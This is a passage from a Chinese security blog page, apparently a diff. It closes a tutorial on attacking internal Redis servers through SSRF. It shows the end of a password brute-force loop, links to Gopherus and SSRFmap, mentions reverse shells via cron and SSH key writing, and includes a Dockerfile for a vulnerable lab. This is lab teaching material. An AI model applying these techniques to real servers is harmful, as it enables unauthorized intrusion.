&quot;+OK\r\n+OK\r\n&quot;.encode() in response:</span><br><span class="line">            print(&quot;redis passwd: &quot; + passwd)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>将爆破得到的密码，加入到<code>redisSsrf.py</code>脚本中，接下来的攻击与未授权访问的攻击流程一样获得服务器的权限。</p>
+<h2 id="SSRF利用工具">SSRF利用工具</h2>
+<p>Gopherus - <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
+<p>Gopherus可以帮助我们直接生成Gopher payload，以利用SSRF（服务器端请求伪造）并获得RCE（远程代码执行），</p>
+<p>例如，本篇文章中的七友师傅的脚本即可用此工具代替直接生成payload。</p>
+<p><img src="1635834472_6180da6800cbacdbdee1b.png!small" alt="image-20210121161607326"></p>
+<p>常用的还有以下两个工具</p>
+<ul>
+<li>SSRFmap - <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a></li>
+<li>shellver - <a target="_blank" rel="noopener" href="https://github.com/0xR0/shellver">https://github.com/0xR0/shellver</a></li>
+</ul>
+<h2 id="总结">总结</h2>
+<p>SSRF攻击内网Redis的利用方式除了写入webshell之外，还可以利用</p>
+<ul>
+<li>计划任务执行命令反弹shell</li>
+<li>写ssh-keygen公钥然后使用私钥登陆</li>
+</ul>
+<p>这两种方法在《Redis未授权漏洞总结》一文中都有详细利用，只要将payload结合本文<code>redisSsrf.py</code>的脚本，就可以实现攻击。</p>
+<p>通过Redis攻击环境的搭建，熟悉了docker命令及dockerfile的编写，还有ubuntu apache2配置及自带的防火墙ufw使用。</p>
+<h2 id="彩蛋">彩蛋</h2>
+<p>Dockerfile文件如何实现Redis未授权环境的定制：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#Redis 未授权访问</span><br><span class="line"></span><br><span class="line"># 基于ubuntu:16.04版本</span><br><span class="line">FROM ubuntu:16.04</span><br><span class="line"></span><br><span class="line"># Maintainer: 设置该镜像的作者</span><br><span class="line">MAINTAINER ju5ton1y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># RUN：用于执行后面跟着的命令行命令。有以下俩种格式：</span><br><span class="line"></span><br><span class="line">## shell 格式：等同于在终端操作的 shell 命令</span><br><span class="line">RUN echo &quot;deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse&quot; &gt; /etc/apt/sources.list  # 换源</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RUN apt-get update  # 更新</span><br><span class="line">RUN apt-get install -y openssh-server make gcc</span><br><span class="line">#RUN wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br><span class="line"></span><br><span class="line"># COPY：从上下文目录中复制文件或者目录到容器里指定路径</span><br><span class="line">COPY redis-3.2.11.tar.gz ./  # 复制redis安装包到容器当前文件夹</span><br><span class="line">RUN tar xzf redis-3.2.11.tar.gz # 解压</span><br><span class="line">RUN cd redis-3.2.11 &amp;&amp; make &amp;&amp; cd src &amp;&amp; cp redis-server /usr/bin &amp;&amp;  cp redis-cli /usr/bin  # 编译并将redis-server及redis-cli复制到/usr/bin目录下</span><br><span class="line"></span><br><span class="line"># ADD：复制文件指令。它有两个参数&lt;source&gt;和&lt;destination&gt;。destination是容器内的路径。source可以是URL或者是启动配置上下文中的一个文件</span><br><span class="line">ADD redis.conf /etc/redis.conf  # 映射配置文件到容器内</span><br><span class="line">ADD sshd_config /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"># EXPOSE：指定容器在运行时监听的端口</span><br><span class="line">EXPOSE 6379 22</span><br><span class="line"></span><br><span class="line">RUN /etc/init.d/ssh restart  # 重启ssh服务</span><br><span class="line"></span><br><span class="line"># CMD 类似于 RUN 指令，在docker run时运行</span><br><span class="line">## exec 格式：等价于 RUN redis-server /etc/redis.conf</span><br><span class="line">CMD [&quot;redis-server&quot;, &quot;/etc/redis.conf&quot;]  # 以被映射到容器中的配置文件启动redis服务</span><br></pre></td></tr></table></figure>
+<p>其中启动配置上下文目录如下：</p>
+<p><img src="1635834473_6180da695cf2a6e665d02.png!small" alt="image-20210119215105383"></p>
+<h2 id="参考">参考</h2>
+<p><a target="_blank" rel="noopener" href="https://ca0y1h.top/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">Web安全基础学习之SSRF漏洞利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://hackmd.io/@Lhaihai/H1B8PJ9hX#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF">SSRF学习记录</a>:</p>
+<p><a target="_blank" rel="noopener" href="https://joychou.org/web/phpssrf.html">SSRF in PHP</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%B5%85%E6%9E%90ssrf%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BBredis/">浅析SSRF认证攻击Redis</a></p>
+<p><a target="_blank" rel="noopener" href="https://yeasy.gitbook.io/docker_practice/">Docker从入门到实践</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/07/%E4%B9%A0%E8%BF%91%E5%B9%B3%E8%87%B4%E4%BF%A1%E7%A5%9D%E8%B4%BA%E6%96%B0%E5%8D%8E%E7%A4%BE%E5%BB%BA%E7%A4%BE90%E5%91%A8%E5%B9%B4/" rel="prev" title="习近平致信祝贺新华社建社90周年强调 赓续红色血脉坚持守正创新 努力建成国际一流新型全媒体机构 在中国记者节到来之际向全国广大新闻工作者致以节日问候">
+      <i class="fa fa-chevron-left"></i> 习近平致信祝贺新华社建社90周年强调 赓续红色血脉坚持守正创新 努力建成国际一流新型全媒体机构 在中国记者节到来之际向全国广大新闻工作者致以节日问候
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis"><span class="nav-number">1.</span> <span class="nav-text">SSRF攻击内网Redis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E2%80%93-RESP%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.1.</span> <span class="nav-text">Redis传输协议–[RESP协议]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E3%80%82"><span class="nav-number">1.1.1.</span> <span class="nav-text">Redis未授权访问。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Redis%E8%AE%A4%E8%AF%81%E8%AE%BF%E9%97%AE%EF%BC%8C"><span class="nav-number">1.1.2.</span> <span class="nav-text">Redis认证访问，</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.2.</span> <span class="nav-text">SSRF攻击复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">1.2.1.</span> <span class="nav-text">Redis未授权访问</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Redis%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%AE%A4%E8%AF%81"><span class="nav-number">1.2.2.</span> <span class="nav-text">Redis弱口令认证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="nav-number">2.</span> <span class="nav-text">SSRF利用工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%A9%E8%9B%8B"><span class="nav-number">4.</span> <span class="nav-text">彩蛋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">chuli000</p>
+  <div class="site-description" itemprop="description">好风凭借力 送我上青云</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chuli000</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
